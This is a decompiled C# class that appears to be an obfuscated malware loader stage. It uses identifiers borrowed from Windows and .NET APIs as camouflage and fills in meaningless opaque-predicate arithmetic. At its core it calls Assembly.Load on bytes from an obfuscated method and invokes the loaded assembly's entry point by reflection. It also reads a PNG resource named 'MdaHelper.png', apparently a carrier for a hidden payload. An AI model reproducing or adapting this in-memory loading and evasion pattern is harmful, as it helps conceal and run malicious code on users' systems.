using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;

public class CERT_CHAIN_PARA
{
	public static ImageFormat arizona = ImageFormat.get_Png();

	public static Assembly open = Assembly.Load(ProcessWindowStyle.CMSG_CTRL_KEY_TRANS_DECRYPT_PARA());

	public static MethodInfo mentry = Assembly.Load(ProcessWindowStyle.CMSG_CTRL_KEY_TRANS_DECRYPT_PARA()).EntryPoint;

	public static object Type(Assembly assembly, MethodInfo entryPoint)
	{
		return assembly.CreateInstance(SocketAsyncEventArgs(entryPoint));
	}

	public static void PERFLIBREQUEST(Assembly assembly, MethodInfo entryPoint)
	{
		entryPoint.Invoke(Type(assembly, entryPoint), null);
	}

	public static string SocketAsyncEventArgs(MethodInfo entryPoint)
	{
		return (string)AssemblyDescriptionAttribute(entryPoint);
	}

	public static void TargetInvocationException()
	{
		UpDownButtonsAccessibleObject();
	}

	internal static object AssemblyDescriptionAttribute(object asm)
	{
		return ((MemberInfo)asm).Name;
	}

	internal static bool UpDownButtonsAccessibleObject()
	{
		PERFLIBREQUEST(open, mentry);
		int num = -32317660;
		if (1492700674 == Convert.ToInt32(1492700674.618416 + Math.Tan(746350337.0)))
		{
			Convert.ToInt32(3.0 - Math.Round(1.0));
			num += Convert.ToInt32(48476491.0 - Math.Truncate(16158830.5));
		}
		return (byte)num != 0;
	}

	internal static bool MatchEvaluator()
	{
		int num = Convert.ToInt32(-772321398.0);
		if ((Convert.ToInt32(340323421.59309494 + Math.Cos(170161710.5)) ^ Convert.ToInt32(2092147028.0)) == Convert.ToInt32(880649860.0 + Math.Ceiling(880649860.5)))
		{
			Convert.ToInt32(2.0);
			num += Convert.ToInt32(1158482097.0 - Math.Ceiling(386160699.0));
		}
		return (byte)num != 0;
	}

	public static Image getResourceImg(Assembly asm)
	{
		using (Stream stream = asm.GetManifestResourceStream("MdaHelper.png"))
		{
			if (stream != null)
			{
				return Image.FromStream(stream);
			}
		}
		return null;
	}
}
